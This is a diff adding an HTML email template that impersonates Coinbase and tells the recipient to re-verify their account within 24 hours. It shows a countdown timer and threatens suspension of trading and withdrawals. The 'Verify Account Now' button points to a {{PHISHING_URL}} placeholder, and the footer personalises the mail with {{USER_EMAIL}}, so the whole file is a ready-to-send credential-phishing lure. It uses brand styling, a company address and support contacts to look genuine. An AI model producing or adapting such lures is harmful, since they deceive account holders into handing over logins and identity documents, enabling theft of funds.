@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification Required - Coinbase</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #333333;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #ffffff;
+        }
+        .header {
+            background: linear-gradient(135deg, #1652f0, #0052ff);
+            padding: 40px;
+            text-align: center;
+        }
+        .logo {
+            width: 50px;
+            height: 50px;
+            background-color: white;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #1652f0;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            color: white;
+            margin: 0;
+            font-size: 28px;
+            font-weight: 700;
+        }
+        .content {
+            padding: 50px 40px;
+        }
+        .verification-notice {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+            border-radius: 8px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .verification-notice h2 {
+            margin: 0 0 10px 0;
+            font-size: 20px;
+        }
+        .verification-notice p {
+            margin: 0;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        .message {
+            line-height: 1.7;
+            font-size: 16px;
+            margin-bottom: 35px;
+        }
+        .cta-container {
+            text-align: center;
+            margin: 40px 0;
+        }
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+            color: white;
+            text-decoration: none;
+            padding: 18px 40px;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 18px;
+            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 210, 255, 0.4);
+        }
+        .urgent-notice {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 0 6px 6px 0;
+        }
+        .countdown {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 25px;
+            border-radius: 8px;
+            text-align: center;
+            margin: 30px 0;
+        }
+        .countdown h3 {
+            margin: 0 0 10px 0;
+            font-size: 22px;
+        }
+        .countdown .time {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .footer {
+            background-color: #2c3e50;
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+        .footer a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        .footer .links {
+            margin: 20px 0;
+        }
+        .footer .links a {
+            margin: 0 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">C</div>
+            <h1>Account Verification</h1>
+        </div>
+
+        <div class="content">
+            <div class="verification-notice">
+                <h2>⚠️ Action Required</h2>
+                <p>Your account verification is pending and requires immediate attention</p>
+            </div>
+
+            <div class="message">
+                <p>Dear Valued Customer,</p>
+                
+                <p>We're writing to inform you that your Coinbase account requires immediate verification to comply with updated financial regulations. <strong>Your account access will be limited until verification is complete.</strong></p>
+                
+                <p>Recent regulatory changes require all cryptocurrency exchange users to re-verify their identity within <strong>24 hours</strong> to continue using our services.</p>
+
+                <div class="urgent-notice">
+                    <strong>Important:</strong> Failure to verify your account within the specified timeframe may result in temporary suspension of trading, withdrawals, and deposits.
+                </div>
+
+                <p><strong>What you need to do:</strong></p>
+                <ol>
+                    <li>Click the verification button below</li>
+                    <li>Sign in to your Coinbase account</li>
+                    <li>Complete the identity verification process</li>
+                    <li>Upload required documentation if prompted</li>
+                </ol>
+            </div>
+
+            <div class="countdown">
+                <h3>Time Remaining</h3>
+                <div class="time">23:45:12</div>
+                <p>Hours : Minutes : Seconds</p>
+            </div>
+
+            <div class="cta-container">
+                <a href="{{PHISHING_URL}}" class="cta-button">
+                    ✓ Verify Account Now
+                </a>
+            </div>
+
+            <p style="font-size: 14px; color: #666; margin-top: 40px;">
+                <strong>Why is this required?</strong><br>
+                New anti-money laundering (AML) and know your customer (KYC) regulations require all cryptocurrency platforms to maintain updated user verification records. This ensures the security and compliance of our platform.
+            </p>
+
+            <p style="font-size: 14px; color: #666;">
+                If you have questions about this verification process, please contact our support team at 
+                <a href="mailto:support@coinbase.com" style="color: #1652f0;">support@coinbase.com</a> or call 1-888-908-7930.
+            </p>
+
+            <p style="font-size: 12px; color: #999; margin-top: 30px;">
+                Reference: VRF-{{RANDOM_ID}}<br>
+                Sent: {{TIMESTAMP}}
+            </p>
+        </div>
+
+        <div class="footer">
+            <p><strong>Coinbase Global, Inc.</strong><br>
+            100 Pine Street, Suite 1250<br>
+            San Francisco, CA 94111, USA</p>
+            
+            <div class="links">
+                <a href="#">Help Center</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Contact Us</a>
+            </div>
+
+            <p style="margin-top: 30px; font-size: 12px; opacity: 0.8;">
+                © 2024 Coinbase Global, Inc. All rights reserved.<br>
+                This email was sent to {{USER_EMAIL}} because you have a Coinbase account.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
